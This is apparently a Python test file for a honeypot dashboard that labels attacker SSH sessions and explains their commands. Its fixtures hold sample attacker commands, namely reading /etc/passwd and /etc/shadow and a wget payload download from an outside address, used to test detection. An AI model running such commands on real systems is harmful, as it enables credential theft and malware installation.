from dashboard.logic import classify_session, explain_action, explain_command


def test_classify_session_explains_bruteforce_payload_attempt():
    label, explanation = classify_session(
        {
            "login_attempts": 5,
            "brute_force_detected": True,
            "login_success": True,
            "commands": ["cat /etc/passwd", "wget http://203.0.113.10/payload"],
        }
    )

    assert label == "SSH brute force + payload attempt"
    assert "username/password" in explanation
    assert "downloading" in explanation


def test_explain_command_identifies_credential_access():
    assert explain_command("cat /etc/shadow").startswith("Credential theft attempt")


def test_classify_session_treats_commands_as_post_login_activity():
    label, explanation = classify_session(
        {
            "login_attempts": 0,
            "brute_force_detected": False,
            "login_success": False,
            "command_count": 2,
            "commands": ["cat /etc/passwd", "wget http://203.0.113.10/payload"],
        }
    )

    assert label == "Successful SSH intrusion + payload attempt"
    assert "entered the fake server" in explanation


def test_explain_action_uses_plain_language():
    assert "fake credentials" in explain_action("show_fake_credentials")
